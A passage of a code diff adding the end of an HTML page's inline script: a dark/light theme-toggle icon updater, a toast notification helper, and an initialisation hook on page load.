+        const themeBtn = document.querySelector(".theme-toggle");
+        if (!themeBtn) {
+          console.warn("Theme button not found");
+          return;
+        }
+        const isDark = document.documentElement.classList.contains("dark");
+        themeBtn.innerHTML = isDark
+          ? '<i class="fas fa-sun"></i>'
+          : '<i class="fas fa-moon"></i>';
+      }
+
+      // Toast notification
+      function showToast(message, type = "success") {
+        const toast = document.createElement("div");
+        toast.className = `toast ${type}`;
+        toast.innerHTML = `<i class="fas fa-${type === "success" ? "check-circle" : "exclamation-circle"}"></i> ${message}`;
+        document.body.appendChild(toast);
+        setTimeout(() => toast.remove(), 4000);
+      }
+
+      // Init on load
+      window.addEventListener("DOMContentLoaded", init);
+    </script>
+  </body>
 </html>
